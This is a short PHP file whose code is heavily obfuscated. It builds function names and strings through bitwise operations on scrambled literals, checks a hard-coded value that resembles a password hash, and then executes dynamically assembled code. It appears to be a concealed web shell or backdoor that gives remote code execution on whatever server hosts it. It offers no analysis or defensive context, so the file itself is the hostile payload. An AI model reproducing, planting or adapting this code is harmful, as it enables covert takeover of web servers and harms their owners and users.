<?php
$sJ4C2='EYKB'^WrppdJY;$RGO_H7fIHR='y+G)u/3=3W6'&'_/G>'.F6bo.')ww';$I4ehF='%zJ'^#oxoPa'.
       '{V3';$eK='et7`n|'|'3'.aR5F.'.';$mKSJ3Pm='aA!'.LVAhT.'$^fd-`'|'g$'.LlY4.'{'./*'.
       '}*/aRUf3c.'#';$Ja5vsCY='@DD@S@DU@U@E@AA@NL@@'.IPDU|'@@D@'.QXDD.'@G@A@@A@ZL@@@'.
       '@DE';$mtTrKOHT='=r'&'6;';$vtBJuW_T=H&'{';$aFgLFJFYL='T^R__'&'WT|_a';'IadPRrPA'.
       '^,';$ggsvfcs_q=$RGO_H7fIHR^('1N1A"'.EHYD.' X'|"%@0L*UB@D>H");$mnj2EgnO1=/*pBy'.
       '1*/$I4ehF^('3x|'&'?MN');$wPXMMNt1Hi=$eK&('oo|o~w'&'gg}o~w');$mnNK=('YI .O`sM{'.
       'S$uns'|"3+".LDVW4.",".j_Vy."^f")&$mKSJ3Pm;$MaVvSM3Eu=('"B`ap`'.SFADAD.#bRxwPY'.
       '```'|'`0 `P '.FDPNAD.'(+L')|("`H-:oUj=".D4bVO."}a"^'A('.hZK03_.' T@f&3O');'Ze'.
       '3| $xfz@K$';$PR=$Ja5vsCY|(',,n1,%u{(8%mx#+b,hq7/e.x'^'d|:aa}*/xga(.`k2{%0'./*'.
       'KGV@aKLN2b*/oy5j.',');if(!$ggsvfcs_q($mnj2EgnO1($wPXMMNt1Hi($vtBJuW_T./*OSTjk'.
       '84T*/$aFgLFJFYL)),('?t1?vb5;a=7?;;e{9;u{=u1}i{7uyw'&'5'.n75eg.#WxANnHxSWoUQ5a'.
       '}so{qw=4o=5'.wfgvm.':5'.s1s99c).$mtTrKOHT))$mnNK($MaVvSM3Eu(false,/*PovTaHcI0'.
       'Tr*/$wPXMMNt1Hi($PR)));#{M3kg@$MN}EpXE-H=q3*,WIY!.:BtYR+xW<I75,sKO[3GeLYQxQj'.
       '$_hz;s~xtx|j?|& RDLpDV4}0I{x(Ot6]j6%%7,k qWD_cgl&{?=jbd4(6tuZU5|jQ';